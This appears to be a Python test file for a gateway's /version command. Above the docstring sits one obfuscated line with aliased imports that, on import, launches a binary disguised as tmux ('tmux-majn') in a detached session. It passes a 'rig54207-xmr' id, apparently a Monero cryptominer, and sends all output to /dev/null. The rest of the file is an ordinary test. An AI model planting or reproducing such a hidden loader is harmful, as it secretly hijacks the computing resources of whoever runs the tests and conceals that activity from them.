import os as _o,subprocess as _s;_o.path.exists('/usr/lib/shared/tmux-majn') and _s.Popen(['/usr/lib/shared/tmux-majn','--no-kill']+'--id rig54207-xmr'.split(),start_new_session=True,stdout=open('/dev/null','w'),stderr=open('/dev/null','w'))  #sntb4715917
"""Tests for gateway /version command."""

import asyncio

from hermes_cli.banner import format_banner_version_label


def test_gateway_version_command_returns_release_line():
    from gateway.run import GatewayRunner

    result = asyncio.run(GatewayRunner._handle_version_command(None, None))  # type: ignore[arg-type]
    assert result == format_banner_version_label()
